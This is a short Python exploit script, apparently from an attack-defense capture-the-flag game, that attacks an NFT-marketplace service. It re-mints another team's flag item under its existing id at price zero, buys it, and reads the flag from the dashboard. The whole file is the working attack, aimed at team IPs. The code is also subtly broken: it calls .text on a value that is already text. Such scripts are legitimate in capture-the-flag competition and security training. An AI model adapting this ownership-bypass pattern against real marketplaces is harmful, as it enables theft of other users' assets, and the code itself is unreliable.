import sys
from service1_common import *


def exploit(ip, flag_id):
    username, password = randstr(8), randstr(8)
    client = Client(ip, username, password)
    client.register_user()

    # login on minter
    client.login_user_minter()
    data = {
        'id': flag_id,
        'title': 'test',
        'data': 'test',
        'price': 0,
        'public': 'true'
    }
    client.sess.post(client.minter_baseurl, data=data)
    # Now the flag is buyable
    client.buy_nft(flag_id)

    resp = client.sess.get(client.closedsea_baseurl+'/dashboard').text
    return find_flag(resp.text)[0]


if __name__ == "__main__":
    team_id = sys.argv[1]
    flag_id = sys.argv[2]
    ip = f"10.60.{team_id}.1"
    print(exploit(ip, flag_id))
